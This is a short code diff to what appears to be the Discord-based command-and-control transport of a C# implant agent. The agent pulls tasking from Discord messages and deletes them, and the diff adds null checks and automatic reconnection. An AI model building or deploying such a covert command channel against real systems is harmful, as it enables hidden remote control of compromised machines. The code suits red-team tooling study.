@@ -40,7 +40,7 @@ namespace Agent.Profiles
 #if LOCALDEBUGDISCORD
             _token = Environment.GetEnvironmentVariable("discord_token");
             Console.WriteLine(_token);
-            _channel_id = ulong.Parse("1161813089545638040");
+            _channel_id = ulong.Parse("1222855026737680384");
 #else
             _token = "discord_token";
             _channel_id = ulong.Parse("bot_channel");
@@ -69,6 +69,12 @@ namespace Agent.Profiles
 
         private async Task _client_MessageReceived(SocketMessage message)
         {
+            if(message is null)
+            {
+                return;
+            }
+
+
             MessageWrapper discordMessage;
             if (message.Attachments.Count > 0 && message.Attachments.FirstOrDefault().Filename.Contains(_uuid))
             {
@@ -86,7 +92,6 @@ namespace Agent.Profiles
                     _ = message.DeleteAsync();
                 }
                 catch { }
-                
 
                 if (!checkedin)
                 {
@@ -105,6 +110,7 @@ namespace Agent.Profiles
                 TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                 this.SetTaskingReceived(this, tra);
             }
+
         }
 
         private async Task<bool> Start()
@@ -136,6 +142,11 @@ namespace Agent.Profiles
             this.cancellationTokenSource = new CancellationTokenSource();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
+                if (_client.LoginState != LoginState.LoggedIn)
+                {
+                    await this.Start();
+                }
+
                 //Check if we have something to send.
                 if (!this.messageManager.HasResponses())
                 {
@@ -161,7 +172,6 @@ namespace Agent.Profiles
         {
             if(_client.LoginState != LoginState.LoggedIn)
             {
-                Console.WriteLine(_client.LoginState);
                 await this.Start();
             }
 
